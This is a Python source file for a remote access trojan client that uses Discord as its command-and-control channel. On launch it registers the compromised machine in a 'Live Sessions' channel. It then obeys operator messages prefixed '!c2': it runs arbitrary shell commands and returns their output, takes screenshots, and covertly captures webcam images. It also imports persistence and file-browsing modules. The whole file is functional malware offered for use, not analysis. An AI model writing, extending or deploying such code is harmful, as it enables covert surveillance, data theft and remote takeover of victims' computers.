import discord
import os
import socket
import asyncio

# Import your execution modules
import command_executor as cmd
import notification_sender as notifier
import screenshot_taker as ss
import system_info as sysinfo
import web_opener
import startup_manager
import file_explorer as fe
import webcam_manager as wcm

# --- Configuration ---
TOKEN_PATH = 'token.txt'
SERVER_CATEGORY_NAME = "🔴 Live Sessions" 
# This is a prefix to identify commands meant for the client
COMMAND_PREFIX = "!c2" 

# --- Bot Setup ---
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
client = discord.Client(intents=intents)

# --- Helper Functions ---
def load_token() -> str:
    if not os.path.exists(TOKEN_PATH):
        raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
    with open(TOKEN_PATH, 'r') as f:
        return f.read().strip()

def get_device_name() -> str:
    hostname = socket.gethostname()
    return "".join(c for c in hostname.lower() if c.isalnum() or c == '-').strip()

# --- Core Event Handlers ---
@client.event
async def on_ready():
    print(f'Client logged in as {client.user} on device {get_device_name()}')
    print('------')
    guild = client.guilds[0]
    device_name = get_device_name()

    category = discord.utils.get(guild.categories, name=SERVER_CATEGORY_NAME)
    if not category:
        category = await guild.create_category(SERVER_CATEGORY_NAME)

    channel = discord.utils.get(guild.text_channels, name=device_name, category=category)
    if not channel:
        channel = await guild.create_text_channel(device_name, category=category)
    
    # Announce presence
    await channel.send(f"🟢 **{device_name}** is now online.")

@client.event
async def on_message(message):
    # Ignore messages from the bot itself
    if message.author == client.user:
        return

    # Only listen in this device's specific channel
    if message.channel.name != get_device_name():
        return

    # Only process messages that start with the command prefix
    if not message.content.startswith(COMMAND_PREFIX):
        return

    print(f"Received command: {message.content}")
    
    # Parse the command
    parts = message.content.split()
    command_name = parts[1]
    args_str = " ".join(parts[2:])

    # --- Command Execution Router ---
    # This is where the client executes the task and posts the result.
    try:
        if command_name == "runcmd":
            output = cmd.execute_command(args_str)
            if len(output) > 1900: output = output[:1900] + "\n[...TRUNCATED...]"
            await message.channel.send(f"```\n{output}\n```")
        
        elif command_name == "takescreenshot":
            ss_file = ss.take_screenshot()
            if ss_file:
                await message.channel.send(file=discord.File(ss_file))
                os.remove(ss_file)
            else:
                await message.channel.send("❌ Failed to take screenshot.")

        elif command_name == "irlpicture":
            img_path = wcm.capture_webcam_image()
            if img_path:
                await message.channel.send(file=discord.File(img_path))
                os.remove(img_path)
            else:
                await message.channel.send("❌ Failed to capture webcam image.")

        # Add other simple command handlers here as needed...
        
    except Exception as e:
        await message.channel.send(f"❌ An error occurred on the client: {e}")

# --- Main Execution ---
if __name__ == "__main__":
    try:
        client.run(load_token())
    except Exception as e:
        print(f"Failed to start client: {e}")